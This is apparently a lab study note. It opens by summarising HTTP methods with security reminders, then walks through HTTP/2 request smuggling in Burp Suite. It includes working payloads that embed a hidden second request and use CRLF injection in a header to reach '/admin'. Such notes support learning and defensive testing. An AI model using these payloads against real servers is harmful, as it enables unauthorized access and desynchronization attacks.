# ------------------------------------------------------------
#                        HTTP METHODS
# ------------------------------------------------------------

## GET
Used to fetch data from the server without making changes.

Security Reminder:
- Do not expose sensitive data.
- Avoid sending tokens or passwords in GET requests because URLs may be logged or visible in plaintext.

---

## POST
Used to send data to the server, usually for creating or updating resources.

Security Reminder:
- Always validate and sanitize user input.
- Helps prevent SQL Injection and XSS attacks.

---

## PUT
Used to completely replace or update a resource.

Security Reminder:
- Ensure proper authorization before allowing modifications.

---

## DELETE
Used to remove resources from the server.

Security Reminder:
- Allow only authorized users to delete resources.

---

## PATCH
Used to partially update a resource.

Security Reminder:
- Validate incoming data carefully to prevent inconsistencies.

---

## HEAD
Similar to GET but returns only headers, not the response body.

Usage:
- Useful for checking metadata without downloading content.

---

## OPTIONS
Returns supported HTTP methods for a resource.

Usage:
- Helps clients understand server capabilities.

---

## TRACE
Used for debugging and diagnostic purposes.

Security Note:
- Often disabled because it may expose sensitive information.

---

## CONNECT
Used to establish secure tunnels, mainly for HTTPS communication.

Usage:
- Important for encrypted communication.

# ------------------------------------------------------------
#                    HTTP REQUEST SMUGGLING
# ------------------------------------------------------------

## Overview

HTTP Request Smuggling occurs when:
- Front-end and back-end servers interpret HTTP requests differently.
- Attackers exploit this mismatch to smuggle hidden requests.

---

# HTTP/2 Request Smuggling

## Basic Process

1. Intercept a request using Burp Suite.
2. Change request method from:

```http
GET
```

to:

```http
POST
```

3. Send request to Repeater.
4. Ensure protocol changes from:

```http
HTTP/1.1
```

to:

```http
HTTP/2
```

5. Append a second hidden HTTP/1.1 request inside the body or headers.

---

# Important Note

To insert a CRLF sequence inside Burp Suite headers:

```text
Press SHIFT + ENTER
```

---

# Example HTTP/2 Smuggling Payload

```http
GET / HTTP/2
Host: 10.10.138.158:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
x: f
```

Explanation:
- Front-end processes first request.
- Back-end interprets second embedded request separately.

---

# HTTP/2 to HTTP/1.1 Smuggling Example

```http
POST /hello HTTP/1.1
Host: 10.10.155.96:8100
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Foo: bar
```

---

# Smuggled Payload Inside Header

Insert the following inside header value:

```http
bar \r\n
Host: 10.10.155.96:8100\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-Fake: a
```

---

# Explanation

This payload:
- Breaks the original request using CRLF sequences.
- Injects a second hidden request:

```http
GET /admin HTTP/1.1
```

- Causes back-end server to process unintended requests.

# ------------------------------------------------------------
#                     QUICK SUMMARY
# ------------------------------------------------------------

✔ HTTP Methods  
✔ HTTP/2 Request Smuggling  
✔ Front-End / Back-End Desync  
✔ CRLF Injection  
✔ Burp Suite Repeater  
✔ Embedded HTTP Requests  
✔ Hidden Request Injection  
✔ Request Desynchronization  
✔ HTTP Header Manipulation  
✔ Smuggling Payloads  

# ------------------------------------------------------------
